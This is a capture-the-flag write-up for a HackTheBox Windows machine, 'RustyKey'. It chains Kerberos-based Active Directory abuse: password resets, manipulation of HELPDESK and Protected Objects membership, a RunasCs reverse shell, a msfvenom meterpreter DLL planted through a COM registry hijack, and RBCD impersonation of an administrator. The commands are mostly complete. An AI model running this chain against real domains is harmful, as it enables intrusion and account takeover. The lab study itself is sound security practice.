---
title: "RustyKey"
date: 2025-06-15
retire_date: 9999-09-09
tags: ["htb", "Windows", "Hard", "Assume Breach"]
difficulty: "Hard"
base_points: 40
event: "HackTheBox"
Author: ""
cover:
  image: "/images/ctf/htb/machines.jpg"
  alt: "RustyKey Machine"
  relative: true
---

{{< machine-info-shortcode >}}

## Walkthrough

Hard - Windows

A Kerberos-only AD box. We come in on an expired account, pivot through a machine account that can self-add to `HELPDESK`, strip targets out of the `Protected Objects` group so we can reset their passwords, then chain a COM hijack and RBCD to reach Administrator.

> Note: this machine is Kerberos-only — every step uses a TGT (`KRB5CCNAME`) and the `-k` / `--kerberos` flags instead of NTLM.

## Foothold

The provided `rr.parker` account has an expired password, so we set a new one over RPC-SAMR:

```
python3 /usr/share/doc/python3-impacket/examples/changepasswd.py -newpass 'Password123!@#' -protocol rpc-samr rustykey.htb/rr.parker@dc.rustykey.htb
```
`changepasswd.py` with `-protocol rpc-samr` resets the expired password directly against the SAM database so we can authenticate.

## HELPDESK abuse

We hold the machine account `IT-COMPUTER3$ : Rusty88!`. First, cache a Kerberos ticket for it:

```
impacket-getTGT -dc-ip 10.129.100.17 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
export KRB5CCNAME=IT-COMPUTER3$.ccache
```
`getTGT` requests a TGT for the machine account; `KRB5CCNAME` points all later tools at that ticket.

As a member of `IT`, the machine account can add itself to the privileged `HELPDESK` group:

```
bloodyAD --host dc.rustykey.htb --dc-ip 10.129.100.17 -d rustykey.htb -k add groupMember 'HELPDESK' IT-COMPUTER3$
```
`bloodyAD add groupMember -k` writes `IT-COMPUTER3$` into `HELPDESK`, inheriting its reset rights.

`HELPDESK` can manage accounts, but targets in the `Protected Objects` group can't be touched — so we remove the protected groups first:

```
bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'Protected Objects' 'IT'
```
Removing `IT` (and `SUPPORT`) from `Protected Objects` strips the protection so their members become resettable.

Now reset a helpdesk-managed user and take it over:

```
bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'pa$$w0rd'
```
`set password` force-resets `bb.morgan` using the HELPDESK right.

## user.txt

Get a ticket as `bb.morgan` and log in over WinRM:

```
impacket-getTGT -dc-ip 10.129.100.17 'rustykey.htb/bb.morgan:pa$$w0rd'
export KRB5CCNAME=bb.morgan.ccache
evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb
```
`evil-winrm -r` authenticates with the cached Kerberos ticket — `user.txt` is here.

## root.txt

### Pivot to ee.reed

Re-add the machine account to `HELPDESK` (resetting `KRB5CCNAME` to its ticket), drop `SUPPORT` from `Protected Objects`, and reset `ee.reed`:

```
export KRB5CCNAME=IT-COMPUTER3$.ccache
bloodyAD --host dc.rustykey.htb --dc-ip 10.129.100.17 -d rustykey.htb -k add groupMember 'HELPDESK' IT-COMPUTER3$
bloodyAD --kerberos --dc-ip 10.129.100.17 --host dc.rustykey.htb -d rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' remove groupMember "CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB" "SUPPORT"
bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'Password1234!'
```

From a `bb.morgan` shell, run a process as `ee.reed`:

```
./RunasCs.exe ee.reed Password1234! cmd.exe -r 10.10.14.60:4444
```
`RunasCs` spawns a reverse shell as `ee.reed`.

### turner — COM hijack

`ee.reed` can write to a CLSID that a privileged user's process loads, so we hijack it with a malicious DLL. Build a meterpreter DLL and start a handler:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.60 LPORT=4444 -f dll -o rev.dll
```
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.60; set LPORT 4444; exploit"
```

Point the 7-Zip COM object's in-process server at our DLL — when `turner` next triggers it, our code runs in their context:

```
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Tools\rev.dll" /f
```
This rewrites the `InprocServer32` default value (the DLL COM loads) to our payload — a classic COM hijack.

### RBCD to Administrator

From the elevated context, grant the machine account delegation rights to the DC, then impersonate a privileged account via S4U:

```
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
```
Configures Resource-Based Constrained Delegation so `IT-COMPUTER3$` may delegate to `DC`.

```
impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.129.100.17 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
export KRB5CCNAME='backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache'
```
`getST -impersonate backupadmin` abuses the RBCD right (S4U2Self + S4U2Proxy) to mint a `cifs/DC` service ticket *as* `backupadmin` — a privileged account that gets us to root.

{{<seperator>}}
